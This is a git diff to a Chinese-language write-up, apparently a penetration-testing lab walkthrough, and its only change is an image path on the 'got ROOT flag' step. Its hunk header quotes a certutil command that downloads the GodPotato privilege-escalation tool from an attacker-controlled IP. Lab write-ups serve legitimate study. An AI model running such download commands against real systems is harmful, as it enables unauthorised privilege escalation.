@@ -152,7 +152,7 @@ certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 
 * 获得ROOT flag：
 
-<figure><img src="../.gitbook/assets/31 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/31 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 本例算中等偏难的机器，锁定可利用的漏洞和提权时都不难，但是其实现过程中需要根据实际情况进行修改和变通。
